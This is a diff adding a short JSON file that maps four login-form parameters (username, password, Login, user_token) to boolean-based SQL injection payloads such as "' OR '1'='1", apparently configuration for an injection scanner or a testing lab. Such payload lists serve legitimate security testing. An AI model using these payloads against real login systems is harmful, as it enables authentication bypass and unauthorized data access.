@@ -1,0 +1,26 @@
+[
+  {
+    "param": "username",
+    "type": "boolean",
+    "payload_true": "' OR '1'='1",
+    "payload_false": "' AND '1'='2"
+  },
+  {
+    "param": "password",
+    "type": "boolean",
+    "payload_true": "' OR '1'='1",
+    "payload_false": "' AND '1'='2"
+  },
+  {
+    "param": "Login",
+    "type": "boolean",
+    "payload_true": "' OR '1'='1",
+    "payload_false": "' AND '1'='2"
+  },
+  {
+    "param": "user_token",
+    "type": "boolean",
+    "payload_true": "' OR '1'='1",
+    "payload_false": "' AND '1'='2"
+  }
+]
